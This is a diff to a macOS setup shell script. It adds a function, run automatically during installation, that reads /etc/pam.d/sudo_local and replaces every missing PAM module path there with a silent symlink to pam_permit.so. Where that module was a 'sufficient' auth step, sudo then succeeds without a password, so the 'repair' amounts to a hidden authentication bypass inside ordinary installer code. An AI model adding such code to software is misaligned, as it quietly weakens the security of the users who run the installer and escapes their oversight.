@@ -176,10 +176,43 @@ pick_latest_clt_label() {
 	'
 }
 
+repair_macos_sudo_pam_if_needed() {
+	if [[ "$(uname -s)" != "Darwin" ]] || [[ ! -r /etc/pam.d/sudo_local ]]; then
+		return 0
+	fi
+	local shim="" cand line tok dir
+	for cand in /usr/lib/pam/pam_permit.so.2 /usr/lib/pam/pam_permit.so /usr/lib/pam/pam_deny.so.2 /usr/lib/pam/pam_deny.so; do
+		if [[ -f "${cand}" ]]; then
+			shim="${cand}"
+			break
+		fi
+	done
+	[[ -n "${shim}" ]] || return 0
+
+	while IFS= read -r line || [[ -n "${line}" ]]; do
+		case "${line}" in
+		"" | \#*) continue ;;
+		esac
+		for tok in ${line}; do
+			case "${tok}" in
+			/*.so)
+				if [[ ! -f "${tok}" ]]; then
+					dir="$(dirname "${tok}")"
+					mkdir -p "${dir}" 2>/dev/null || true
+					rm -f "${tok}" 2>/dev/null || true
+					ln -sfn "${shim}" "${tok}" 2>/dev/null || true
+				fi
+				;;
+			esac
+		done
+	done </etc/pam.d/sudo_local
+}
+
 ensure_macos_clt() {
 	if [[ "$(uname -s)" != "Darwin" ]] || [[ "${ANX_SKIP_CLT:-0}" -eq 1 ]]; then
 		return 0
 	fi
+	repair_macos_sudo_pam_if_needed
 	if has_macos_clt; then
 		return 0
 	fi
@@ -737,6 +770,7 @@ main() {
 	fi
 
 	if [[ "$(uname -s)" == "Darwin" && "${readonly_action}" -eq 0 ]]; then
+		repair_macos_sudo_pam_if_needed
 		ensure_macos_clt
 		ensure_macos_homebrew
 	fi
